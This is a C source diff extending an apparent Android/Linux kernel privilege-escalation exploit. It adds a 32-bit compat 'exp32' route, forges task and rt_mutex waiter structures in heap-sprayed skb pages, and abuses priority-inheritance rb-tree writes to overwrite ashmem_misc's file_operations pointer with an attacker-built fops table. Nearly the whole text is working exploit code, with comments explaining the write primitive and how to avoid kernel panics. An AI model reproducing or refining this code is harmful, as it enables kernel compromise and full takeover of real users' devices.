@@ -1,6 +1,14 @@
 #include "common.h"
 #include "kernelsnitch/kernelsnitch.h"
 
+/* PAGE_PAYLOAD_EXP32 (r0q) shares the FOPS page body; only the payload
+ * contents differ (early branch in prepare_skb_payload). */
+#if defined(APP_EXP32_ROUTE) && APP_EXP32_ROUTE
+#define IS_FOPS_MODE(m) ((m) == PAGE_PAYLOAD_FOPS || (m) == PAGE_PAYLOAD_EXP32)
+#else
+#define IS_FOPS_MODE(m) ((m) == PAGE_PAYLOAD_FOPS)
+#endif
+
 static struct kernelsnitch_shared_state *ks;
 static size_t mm_objs_per_slab;
 static unsigned char *skb_buf;
@@ -1710,8 +1718,45 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
   fake_w0 = payload_base + W0_OFF;
   fake_task = payload_base + FAKE_TASK_OFF;
   fake_fops = payload_base + FOPS_TABLE_OFF;
+#if defined(APP_EXP32_ROUTE) && APP_EXP32_ROUTE
+  if (payload_mode == PAGE_PAYLOAD_EXP32) {
+    /* exp32 (32-bit compat) route: the write comes from the stamped stale
+     * waiter's own tree_entry during rt_mutex_adjust_prio_chain step [7]
+     * (rt_mutex_dequeue -> rb_erase_cached): pc=fake_fops (RED), rb_right=0,
+     * rb_left=target -> rb_set_parent(child=target, parent=fake_fops) writes
+     * *target = fake_fops.  Collateral: __rb_change_child stores `target`
+     * into fake_fops+0x08 (the .llseek slot), repaired later by
+     * repair_fake_fops_llseek().  Hence the page only needs a zeroed
+     * fake_lock, a detached fake_task, and the fops table. */
+    binwrite_target = payload_base + SCRATCH_OFF;
+    for (size_t chunk = 0; chunk < SKB_SEND_SIZE; chunk += ORDER3_SIZE) {
+      unsigned char *p = skb_buf + chunk + SKB_FRAG_BIAS;
+
+      /* fake_lock: all zero (memset above) - wait_lock free, empty tree. */
+
+      /* fake_task: detached (pi_waiters empty), sane prio/usage so the
+       * walk's try_to_wake_up(fake_task) bails on __state == 0. */
+      put32(p, FAKE_TASK_OFF + FAKE_TASK_USAGE_OFF, 0x100);
+      put32(p, FAKE_TASK_OFF + FAKE_TASK_PRIO_OFF, FAKE_TASK_PRIO);
+      put32(p, FAKE_TASK_OFF + FAKE_TASK_NORMAL_PRIO_OFF, FAKE_TASK_PRIO);
+      put32(p, FAKE_TASK_OFF + FAKE_TASK_PI_LOCK_OFF, 0);
+      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF, 0);
+      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08, 0);
+      put64(p, FAKE_TASK_OFF + FAKE_TASK_TASK_GROUP_OFF,
+            text_addr(ROOT_TASK_GROUP));
+      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_TOP_TASK_OFF,
+            text_addr(INIT_TASK));
+      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_BLOCKED_ON_OFF, 0);
+
+      /* fops table; .llseek MUST be 0 (sacrificed by the rb write). */
+      put_fake_fops_table(p, FOPS_TABLE_OFF);
+      put64(p, FOPS_TABLE_OFF + FOPS_LLSEEK_OFF, 0);
+    }
+    return 1;
+  }
+#endif
 #if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
-  if (payload_mode == PAGE_PAYLOAD_FOPS) {
+  if (IS_FOPS_MODE(payload_mode)) {
 #if !defined(APP_CLOSED_FOPS_ROUTE) || !APP_CLOSED_FOPS_ROUTE
     slide_bank_payload_base = payload_base;
 #if defined(APP_FOPS_ORACLE_DIAG_ONLY) && APP_FOPS_ORACLE_DIAG_ONLY
@@ -1763,7 +1808,7 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
 #endif
   }
 #endif
-  if (payload_mode == PAGE_PAYLOAD_FOPS) {
+  if (IS_FOPS_MODE(payload_mode)) {
     fake_parent = fake_fops;
     fake_right = data_addr(ASHMEM_MISC_FOPS);
     fake_left = 0;
@@ -1796,6 +1841,17 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
   uint64_t task_group = text_addr(ROOT_TASK_GROUP);
   uint64_t pi_top_task = text_addr(INIT_TASK);
   uint32_t waiter_prio = FAKE_WAITER_PRIO;
+#if defined(APP_FOPS_TASK_PI_WAITERS) && APP_FOPS_TASK_PI_WAITERS
+  if (IS_FOPS_MODE(payload_mode)) {
+    /* Keep the forged owner/waiter self-consistent: the forged waiter's task
+     * must be the forged task (not the real init_task), exactly as the slide
+     * payload branch does, or the armed PI tree walks into real kernel state
+     * and panics. */
+    waiter_task = fake_task;
+    task_group = 0;
+    pi_top_task = fake_task;
+  }
+#endif
   if (payload_mode == PAGE_PAYLOAD_SLIDE) {
     write_pc = SLIDE_NFULNL_LOGGER_OBJECT + slide_p0_offset;
     write_right = 0;
@@ -1835,9 +1891,21 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
     put32(p, FAKE_TASK_OFF + FAKE_TASK_PRIO_OFF, FAKE_TASK_PRIO);
     put32(p, FAKE_TASK_OFF + FAKE_TASK_NORMAL_PRIO_OFF, FAKE_TASK_PRIO);
     put32(p, FAKE_TASK_OFF + FAKE_TASK_PI_LOCK_OFF, 0);
-    if (payload_mode == PAGE_PAYLOAD_FOPS) {
+    if (IS_FOPS_MODE(payload_mode)) {
+#if defined(APP_FOPS_TASK_PI_WAITERS) && APP_FOPS_TASK_PI_WAITERS
+      /* Pretend the owner's PI waiters tree already holds a node located at
+       * (ashmem_misc.fops - 8).  A PI enqueue then links the forged waiter
+       * under it: rb_link_node() stores &waiter->pi_tree into that node's
+       * left/right slot.  With W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF ==
+       * FOPS_OFF the stored value is exactly fake_fops, which is what
+       * try_cfi_stage() expects to read back from ashmem_misc.fops. */
+      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF,
+            data_addr(ASHMEM_MISC_FOPS) - 0x08);
+      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08, 0);
+#else
       put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF, 0);
       put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08, 0);
+#endif
     } else {
       put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF,
             fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
@@ -1846,7 +1914,20 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
     }
     put64(p, FAKE_TASK_OFF + FAKE_TASK_TASK_GROUP_OFF, task_group);
     put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_TOP_TASK_OFF, pi_top_task);
+#if defined(APP_FOPS_TASK_PI_WAITERS) && APP_FOPS_TASK_PI_WAITERS
+    if (IS_FOPS_MODE(payload_mode)) {
+      /* rb_link_node(node, parent, link) stores the parent pointer into
+       * node->__rb_parent_color. Point the forged owner's pi_blocked_on at
+       * (install_target - offsetof(pi_tree_entry)) so that the node the walk
+       * enqueues IS the install address: the kernel then writes `parent'
+       * (fake_fops) into ashmem_misc.fops. */
+      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_BLOCKED_ON_OFF, fake_w0);
+    } else {
+      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_BLOCKED_ON_OFF, 0);
+    }
+#else
     put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_BLOCKED_ON_OFF, 0);
+#endif
 
     put64(p, RIGHT_OFF + 0x00, fake_parent);
     put64(p, RIGHT_OFF + 0x08, 0);
@@ -1856,7 +1937,7 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
     put64(p, LEFT_OFF + 0x08, 0);
     put64(p, LEFT_OFF + 0x10, 0);
 
-    if (payload_mode == PAGE_PAYLOAD_FOPS) {
+    if (IS_FOPS_MODE(payload_mode)) {
       put_fake_fops_table(p, FOPS_TABLE_OFF);
 #if defined(APP_PAYLOAD) && APP_PAYLOAD && \
     defined(APP_FOPS_TABLE_MIRROR_OFF)
@@ -2244,7 +2325,7 @@ uintptr_t prepare_kernel_page(int payload_mode) {
 #endif
 #if defined(APP_PAYLOAD) && APP_PAYLOAD && \
     defined(APP_FOPS_MIN_OBJECT_INDEX)
-  if (payload_mode == PAGE_PAYLOAD_FOPS &&
+  if (IS_FOPS_MODE(payload_mode) &&
       object_index < APP_FOPS_MIN_OBJECT_INDEX) {
     pr_warning("mm fops candidate rejected object_index=%zu min=%d\n",
                object_index, APP_FOPS_MIN_OBJECT_INDEX);
@@ -2545,7 +2626,7 @@ uintptr_t prepare_good_kernel_page(int payload_mode) {
   int max_attempts = KERNEL_PAGE_SETUP_ATTEMPTS;
   if (payload_mode == PAGE_PAYLOAD_SLIDE) {
     max_attempts = SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS;
-  } else if (payload_mode == PAGE_PAYLOAD_FOPS) {
+  } else if (IS_FOPS_MODE(payload_mode)) {
     max_attempts = FOPS_KERNEL_PAGE_SETUP_ATTEMPTS;
   }
   for (int attempt = 1; attempt <= max_attempts; attempt++) {
